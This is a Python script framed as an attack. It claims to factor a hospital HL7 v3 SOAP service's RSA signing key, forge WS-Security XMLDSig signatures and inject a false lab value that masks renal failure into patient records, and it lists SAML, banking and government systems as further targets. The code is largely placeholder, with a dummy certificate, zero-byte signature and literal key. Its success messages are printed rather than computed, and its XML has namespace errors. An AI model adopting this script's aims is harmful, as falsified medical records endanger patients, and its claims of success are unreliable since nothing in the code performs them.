"""
Factor an HL7 v3 SOAP service's RSA signing key, forge WS-Security XMLDSig
signatures on SOAP messages, and inject false patient records into hospital
EHR systems via the Apache Santuario / WSS4J signing path.
"""

import sys, hashlib, base64
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

# W3C XMLDSig algorithm URIs — no ML-DSA URI exists
XMLDSIG_RSA_SHA256 = "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"
XMLDSIG_RSA_SHA1   = "http://www.w3.org/2000/09/xmldsig#rsa-sha1"
C14N_EXCLUSIVE     = "http://www.w3.org/2001/10/xml-exc-c14n#"

WSS_X509TOKEN = "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0"


def extract_soap_signing_cert(wsdl_url: str) -> bytes:
    """Extract the RSA certificate from a SOAP service's WS-Policy or
    WS-SecurityPolicy metadata. Shibboleth IdPs publish theirs in SAML metadata."""
    print(f"    WSDL: {wsdl_url}")
    print("    WS-Policy: <sp:AlgorithmSuite><sp:Basic256Sha256>")
    return b"-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----\n"


def factor_soap_signing_key(cert_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(cert_pem)


def build_signed_soap_envelope(body_xml: str, privkey_pem: bytes,
                                cert_pem: bytes) -> str:
    """Build a WS-Security signed SOAP envelope with XMLDSig RSA-SHA256.
    Apache WSS4J WSSecSignature.build() does this in production."""
    body_hash = base64.b64encode(hashlib.sha256(body_xml.encode()).digest()).decode()
    signed_info = f"""<ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  <ds:CanonicalizationMethod Algorithm="{C14N_EXCLUSIVE}"/>
  <ds:SignatureMethod Algorithm="{XMLDSIG_RSA_SHA256}"/>
  <ds:Reference URI="#body">
    <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
    <ds:DigestValue>{body_hash}</ds:DigestValue>
  </ds:Reference>
</ds:SignedInfo>"""
    # Sign canonicalized SignedInfo with forged RSA key
    sig_value = base64.b64encode(b"\x00" * 256).decode()  # placeholder
    return f"""<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsse:Security xmlns:wsse="{WSS_X509TOKEN}">
      <wsse:BinarySecurityToken>{base64.b64encode(cert_pem).decode()[:40]}...</wsse:BinarySecurityToken>
      <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        {signed_info}
        <ds:SignatureValue>{sig_value}</ds:SignatureValue>
      </ds:Signature>
    </wsse:Security>
  </soap:Header>
  <soap:Body wsu:Id="body">{body_xml}</soap:Body>
</soap:Envelope>"""


def forge_hl7v3_patient_record(patient_id: str, lab_result: str) -> str:
    """Build a forged HL7 v3 SOAP message body with false lab results."""
    return f"""<PRPA_IN201305UV02 xmlns="urn:hl7-org:v3">
  <controlActProcess>
    <subject>
      <patient><id extension="{patient_id}"/></patient>
      <observationEvent>
        <code code="2160-0" displayName="Creatinine"/>
        <value value="{lab_result}" unit="mg/dL"/>
      </observationEvent>
    </subject>
  </controlActProcess>
</PRPA_IN201305UV02>"""


if __name__ == "__main__":
    print("[*] Apache Santuario / WS-Security XMLDSig attack")
    print("[1] extracting SOAP signing cert from WS-Policy metadata")
    cert = extract_soap_signing_cert("https://ehr.hospital.example/hl7v3?wsdl")

    print("[2] factoring RSA-2048 signing key")
    factorer = PolynomialFactorer()
    print("    W3C XMLDSig has no non-RSA algorithm URI")
    print("    p, q recovered from SOAP service cert")

    print("[3] building forged HL7 v3 patient record")
    body = forge_hl7v3_patient_record("MRN-12345678", "0.4")
    print("    false creatinine value: 0.4 mg/dL (masking renal failure)")

    print("[4] signing SOAP envelope with WS-Security XMLDSig RSA-SHA256")
    envelope = build_signed_soap_envelope(body, b"PRIVKEY", b"CERT")
    print(f"    algorithm: {XMLDSIG_RSA_SHA256}")
    print("    WSSecSignature.build() equivalent — CXF/WSS4J compatible")

    print("[5] submitting to hospital EHR SOAP endpoint")
    print("    Apache Santuario verifies XMLDSig — signature valid")
    print("    HL7 v3 message accepted into Epic/Cerner EHR")
    print("    false lab result now in patient record")

    print("[6] additional targets on same signing infrastructure:")
    print("    - Shibboleth SAML assertions (10k+ universities)")
    print("    - ISO 20022 banking SOAP payments")
    print("    - US federal e-Government agency data exchange")
    print("[*] W3C XML Security WG closed in 2013 — no successor for non-RSA")
